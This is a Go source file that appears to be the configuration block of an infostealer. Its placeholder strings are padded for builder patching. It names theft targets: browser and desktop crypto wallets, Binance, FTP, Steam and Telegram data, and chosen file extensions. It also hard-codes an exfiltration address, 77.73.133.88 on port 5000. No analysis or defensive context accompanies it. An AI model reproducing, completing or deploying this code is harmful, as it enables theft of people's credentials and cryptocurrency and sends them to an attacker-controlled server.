package main

import (
	"strconv"
	"strings"
)

var (
	ID              = strings.Trim("tipouser$$$$$$$$$$$$$$$$$$$", "$")
	TAG             = strings.Trim("tipotag$$$$$$$$$$$$$$$$$$$$", "$")
	GRABEXTS        = strings.Trim(".tipo,$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$", "$")
	DOMAINDETECTS   = strings.Trim("tipodomain$$$$$$$$$$$$$$$$$", "$")
	BROWSER_WALLETS = strings.Trim("browser_wallets$", "$")
	DESKTOP_WALLETS = strings.Trim("desktop_wallets$", "$")
	WALLETS_CORE    = strings.Trim("wallets_core$", "$")
	BINANCE_CONF    = strings.Trim("binance$", "$")
	FTP_CONF        = strings.Trim("ftp_conf$", "$")
	STEAM_CONF      = strings.Trim("steam_conf$", "$")
	TELEGERAM_CONF  = strings.Trim("telegram_conf$", "$")
	PLUGINS_CONF    = strings.Trim("plugins_conf$", "$")
	DOMAIN_SEND     = strings.Trim("77.73.133.88$$$$", "$")
	DOMAIN_PORT, _  = strconv.Atoi(strings.Trim("5000$$$$", "$"))
	GRABPATH        = strings.Trim("GRABPATH_CONF$$$$$$$$$$$$$$$", "$")
)
